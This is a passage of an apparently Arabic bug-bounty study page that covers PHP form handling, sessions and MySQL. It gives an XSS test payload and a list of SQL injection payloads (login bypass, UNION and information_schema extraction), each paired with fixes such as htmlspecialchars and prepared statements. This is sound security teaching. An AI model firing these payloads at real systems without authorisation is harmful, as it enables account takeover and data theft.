<pre><span class="tg">&lt;?php</span>
  <span class="kw">echo</span> <span class="str">"مرحبا بالعالم!"</span>;  <span class="cm">// طباعة</span>
  <span class="kw">$name</span> = <span class="str">"Ahmed"</span>;        <span class="cm">// المتغيرات بتبدأ بـ $</span>
  <span class="kw">echo</span> <span class="str">"اسمي "</span> . <span class="kw">$name</span>;  <span class="cm">// . للدمج</span>
<span class="tg">?&gt;</span></pre></div>
  </div></div>

  <div class="sc"><div class="st">📨 استقبال بيانات الـ Form</div><div class="sb">
    <div class="cb"><div class="ch"><span>receive.php</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="tg">&lt;?php</span>
<span class="cm">// استقبال POST</span>
<span class="kw">$user</span> = <span class="kw">$_POST</span>[<span class="str">'username'</span>];
<span class="kw">$pass</span> = <span class="kw">$_POST</span>[<span class="str">'password'</span>];

<span class="cm">// استقبال GET - من الـ URL</span>
<span class="cm">// مثال: /profile.php?id=5</span>
<span class="kw">$id</span> = <span class="kw">$_GET</span>[<span class="str">'id'</span>];

<span class="cm">// ❌ خطير - XSS!</span>
<span class="kw">echo</span> <span class="str">"مرحبا: "</span> . <span class="kw">$user</span>;

<span class="cm">// ✅ آمن</span>
<span class="kw">echo</span> <span class="str">"مرحبا: "</span> . <span class="fn">htmlspecialchars</span>(<span class="kw">$user</span>);
<span class="tg">?&gt;</span></pre></div>
    <div class="pb"><strong>🎯 XSS</strong>لو السيرفر بيعمل echo بدون htmlspecialchars = ثغرة. ابعت: &lt;script&gt;alert(1)&lt;/script&gt;</div>
  </div></div>

  <div class="sc"><div class="st">🔐 Sessions</div><div class="sb">
    <div class="cb"><div class="ch"><span>session.php</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="tg">&lt;?php</span>
<span class="fn">session_start</span>();  <span class="cm">// لازم في أول الكود</span>

<span class="cm">// بعد login ناجح - احفظ في session</span>
<span class="kw">$_SESSION</span>[<span class="str">'user'</span>] = <span class="str">"Ahmed"</span>;
<span class="kw">$_SESSION</span>[<span class="str">'role'</span>] = <span class="str">"admin"</span>;

<span class="cm">// في صفحة تانية - تحقق</span>
<span class="kw">if</span> (!isset(<span class="kw">$_SESSION</span>[<span class="str">'user'</span>])) {
  <span class="fn">header</span>(<span class="str">"Location: /login"</span>);
  <span class="fn">exit</span>();
}
<span class="tg">?&gt;</span></pre></div>
    <div class="pb"><strong>🎯 Session Hijacking</strong>الـ Session ID في الـ Cookie. سرقة الـ Cookie = دخول على الحساب بدون باسورد!</div>
  </div></div>

  <div class="sc"><div class="st">🔗 ربط PHP بـ MySQL</div><div class="sb">
    <div class="cb"><div class="ch"><span>connect.php</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="tg">&lt;?php</span>
<span class="kw">$conn</span> = <span class="kw">new</span> <span class="fn">mysqli</span>(
  <span class="str">"localhost"</span>,  <span class="cm">// السيرفر</span>
  <span class="str">"root"</span>,       <span class="cm">// اليوزر</span>
  <span class="str">"password"</span>,   <span class="cm">// الباسورد</span>
  <span class="str">"mydb"</span>        <span class="cm">// اسم الداتابيز</span>
);

<span class="kw">$result</span> = <span class="kw">$conn</span>-><span class="fn">query</span>(<span class="str">"SELECT * FROM users"</span>);
<span class="tg">?&gt;</span></pre></div>
  </div></div>
</div>

<!-- MySQL -->
<div class="tp" id="mysql">
  <div class="th"><div class="ti">🔷</div><div><div class="tt">MySQL</div><div class="td">الداتابيز - هنا بتحصل أخطر الثغرات</div></div></div>
  <div class="sc"><div class="st">📌 الداتابيز إيه؟</div><div class="sb">
    <p>بتتخيلها كـ <b>Excel</b> فيها جداول وصفوف وأعمدة. كل موقع عنده داتابيز فيها يوزرات وباسووردات.</p>
    <div class="cb"><div class="ch"><span>مثال جدول users</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre>id | username | password_hash           | role
---|----------|-------------------------|------
1  | admin    | 5f4dcc3b5aa765d61d8...  | admin
2  | ahmed    | d8578edf8458ce06fbc...  | user</pre></div>
  </div></div>

  <div class="sc"><div class="st">📝 أساسيات SQL</div><div class="sb">
    <div class="cb"><div class="ch"><span>basic.sql</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="cm">-- جيب كل البيانات</span>
<span class="kw">SELECT</span> * <span class="kw">FROM</span> users;

<span class="cm">-- جيب بشرط</span>
<span class="kw">SELECT</span> * <span class="kw">FROM</span> users <span class="kw">WHERE</span> id = <span class="nm">1</span>;

<span class="cm">-- login query عادية</span>
<span class="kw">SELECT</span> * <span class="kw">FROM</span> users
<span class="kw">WHERE</span> username = <span class="str">'ahmed'</span>
<span class="kw">AND</span>  password  = <span class="str">'mypass'</span>;

<span class="cm">-- ضيف بيانات</span>
<span class="kw">INSERT INTO</span> users (username, password)
<span class="kw">VALUES</span> (<span class="str">'newuser'</span>, <span class="str">'pass123'</span>);

<span class="cm">-- احذف</span>
<span class="kw">DELETE FROM</span> users <span class="kw">WHERE</span> id = <span class="nm">5</span>;</pre></div>
  </div></div>

  <div class="sc"><div class="st">💉 SQL Injection - ملك الثغرات</div><div class="sb">
    <p>لو السيرفر بيبني الـ SQL Query بإدخال المستخدم مباشرة بدون تنظيف:</p>
    <div class="cb"><div class="ch"><span>الكود الخطير</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="kw">$sql</span> = <span class="str">"SELECT * FROM users
        WHERE username='$user'
        AND  password='$pass'"</span>;</pre></div>
    <div class="cb"><div class="ch"><span>الهجوم - اكتب كـ username</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="cm">-- الإدخال:</span>
<span class="str">admin'--</span>

<span class="cm">-- الـ Query هتبقى:</span>
<span class="kw">SELECT</span> * <span class="kw">FROM</span> users
<span class="kw">WHERE</span> username=<span class="str">'admin'</span><span class="cm">--' AND password='...'</span>

<span class="cm">-- الـ -- علّقت باقي الـ query
-- يعني بتدخل كـ admin بدون باسورد!</span></pre></div>
    <div class="pb">
      <strong>🎯 أهم SQLi Payloads</strong>
      ' OR '1'='1 → bypass login كامل<br>
      admin'-- → bypass الباسورد<br>
      ' UNION SELECT 1,2,3-- → سحب داتا تانية<br>
      ' AND 1=2 UNION SELECT table_name,2,3 FROM information_schema.tables--
    </div>
  </div></div>

  <div class="sc"><div class="st">🛡️ الحماية الصح</div><div class="sb">
    <div class="cb"><div class="ch"><span>secure.php - Prepared Statements</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="tg">&lt;?php</span>
<span class="cm">// ✅ الطريقة الآمنة</span>
<span class="kw">$stmt</span> = <span class="kw">$conn</span>-><span class="fn">prepare</span>(
  <span class="str">"SELECT * FROM users WHERE username=? AND password=?"</span>
);
<span class="kw">$stmt</span>-><span class="fn">bind_param</span>(<span class="str">"ss"</span>, <span class="kw">$user</span>, <span class="kw">$pass</span>);
<span class="kw">$stmt</span>-><span class="fn">execute</span>();
<span class="cm">// الـ SQLi مش هيشتغل هنا خالص</span>
<span class="tg">?&gt;</span></pre></div>
    <div class="tb"><strong>💡 ليه آمن؟</strong>Prepared Statement بيفصل الكود عن البيانات. مهما حطيت SQL، هيتعامل معاها كـ نص مش كـ كود!</div>
  </div></div>

  <div class="sc"><div class="st">🔍 Queries مفيدة في SQLi Recon</div><div class="sb">
    <div class="cb"><div class="ch"><span>sqli-recon.sql</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="cm">-- جيب أسماء كل الجداول</span>
<span class="kw">SELECT</span> table_name <span class="kw">FROM</span> information_schema.tables
<span class="kw">WHERE</span> table_schema = <span class="fn">database</span>();

<span class="cm">-- جيب أعمدة جدول معين</span>
<span class="kw">SELECT</span> column_name <span class="kw">FROM</span> information_schema.columns
<span class="kw">WHERE</span> table_name = <span class="str">'users'</span>;

<span class="cm">-- معلومات السيرفر</span>
<span class="kw">SELECT</span> @@version;    <span class="cm">-- إصدار MySQL</span>
<span class="kw">SELECT</span> <span class="fn">user</span>();       <span class="cm">-- اليوزر الحالي</span>
<span class="kw">SELECT</span> <span class="fn">database</span>();  <span class="cm">-- اسم الداتابيز</span></pre></div>
  </div></div>
</div>

</div>
<script>
function sw(t,btn){
  document.querySelectorAll('.tp').forEach(x=>x.classList.remove('a'));
  document.querySelectorAll('.nb').forEach(x=>x.classList.remove('a'));
  document.getElementById(t).classList.add('a');
  btn.classList.add('a');
  window.scrollTo(0,0);
}
function cp(btn){
  const text=btn.closest('.cb').querySelector('pre').innerText;
  navigator.clipboard.writeText(text).then(()=>{
    btn.textContent='✓ تم';
    setTimeout(()=>btn.textContent='نسخ',2000);
  });
}


// ═══ PAGE SWITCHER ═══
function showPage(name, btn) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.gn-btn').forEach(b => b.classList.remove('on'));
  const page = document.getElementById('page-' + name);
  if(page) page.classList.add('active');
  if(btn) btn.classList.add('on');
  window.scrollTo(0, 0);
}

// ═══ HOME PAGE: Fix internal links ═══
document.querySelectorAll('#page-home a[href]').forEach(a => {
  const href = a.getAttribute('href');
  if(href === 'bug-bounty-encyclopedia.html') {
    a.removeAttribute('href');
    a.style.cursor='pointer';
    a.onclick = (e) => { e.preventDefault(); showPage('encyclopedia', document.querySelectorAll('.gn-btn')[1]); };
  } else if(href === 'bug-bounty-writeups-bible.html') {
    a.removeAttribute('href');
    a.style.cursor='pointer';
    a.onclick = (e) => { e.preventDefault(); showPage('bible', document.querySelectorAll('.gn-btn')[2]); };
  } else if(href === 'bug-bounty-trainer.html') {
    a.removeAttribute('href');
    a.style.cursor='pointer';
    a.onclick = (e) => { e.preventDefault(); showPage('trainer', document.querySelectorAll('.gn-btn')[3]); };
  } else if(href === 'web-reference.html') {
    a.removeAttribute('href');
    a.style.cursor='pointer';
    a.onclick = (e) => { e.preventDefault(); showPage('reference', document.querySelectorAll('.gn-btn')[4]); };
  }
});

// ═══ CURSOR (home page) ═══
const cursor = document.getElementById('cursor');
if(cursor) {
  document.addEventListener('mousemove', e => {
    cursor.style.left = e.clientX - 4 + 'px';
    cursor.style.top = e.clientY - 4 + 'px';
  });
}

// ═══ ENCYCLOPEDIA functions ═══
function go(name){
  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('on'));
  document.querySelectorAll('.navbtn').forEach(b=>b.classList.remove('on'));
  const el = document.getElementById('p-'+name);
  if(el) el.classList.add('on');
  const names=['idor','auth','logic','xss','csrf','ssrf','race','upload','api','tricks','sources','roadmap'];
  const i=names.indexOf(name);
  if(i>=0){const btns=document.querySelectorAll('.navbtn');if(btns[i])btns[i].classList.add('on');}
  window.scrollTo({top:0,behavior:'smooth'});
}
function tog(card){if(card)card.classList.toggle('op')}

// ═══ BIBLE functions ═══
function show(name){
  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('show'));
  document.querySelectorAll('.idx-btn').forEach(b=>b.classList.remove('active'));
  const el = document.getElementById('p-'+name);
  if(el) el.classList.add('show');
  const names=['idor','auth','logic','xss','csrf','ssrf','race','upload','api','roadmap'];
  const i=names.indexOf(name);
  if(i>=0){const btns=document.querySelectorAll('.idx-btn');if(btns[i])btns[i].classList.add('active');}
  window.scrollTo({top:0,behavior:'smooth'});
}
function toggle(card){if(card)card.classList.toggle('open')}

// ═══ TRAINER functions ═══
function switchTab(name){
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.content').forEach(c=>c.classList.remove('active'));
  const tabNames=['map','xss','csrf','ssrf','api','race','upload','mobile','hunt','report'];
  const idx=tabNames.indexOf(name);
  const tabs=document.querySelectorAll('.tab');
  if(idx>=0&&tabs[idx])tabs[idx].classList.add('active');
  const el=document.getElementById('tab-'+name);
  if(el)el.classList.add('active');
}
function toggleCard(card){if(card)card.classList.toggle('open')}
function updateProgress(){
  const all=document.querySelectorAll('.check-item input[type="checkbox"]');
  const done=document.querySelectorAll('.check-item input[type="checkbox"]:checked');
  const pct=Math.min(35+Math.round((done.length/Math.max(all.length,1))*20),100);
  const pctEl=document.getElementById('pct');
  const pfill=document.getElementById('pfill');
  if(pctEl)pctEl.textContent=pct+'%';
  if(pfill)pfill.style.width=pct+'%';
}
function resetProgress(){updateProgress();}
document.addEventListener('change',e=>{if(e.target&&e.target.type==='checkbox')updateProgress();});

// ═══ REFERENCE functions ═══
function sw(t,btn){
  document.querySelectorAll('.tp').forEach(p=>p.classList.remove('a'));
  document.querySelectorAll('.nb').forEach(b=>b.classList.remove('a'));
  const el=document.getElementById(t);
  if(el)el.classList.add('a');
  if(btn)btn.classList.add('a');
}
function cp(btn){
  const pre=btn.closest('.cb').querySelector('pre');
  if(pre){
    navigator.clipboard.writeText(pre.innerText).then(()=>{
      const orig=btn.textContent;
      btn.textContent='✓';
      setTimeout(()=>btn.textContent=orig,1500);
    });
  }
}

// Init first cards open
setTimeout(()=>{
  document.querySelectorAll('#page-encyclopedia .wcard:first-of-type').forEach(c=>c.classList.add('op'));
  document.querySelectorAll('#page-bible .writeup-card:first-of-type').forEach(c=>c.classList.add('open'));
  document.querySelectorAll('#page-trainer #tab-map .vuln-card:first-of-type').forEach(c=>c.classList.add('open'));
}, 200);

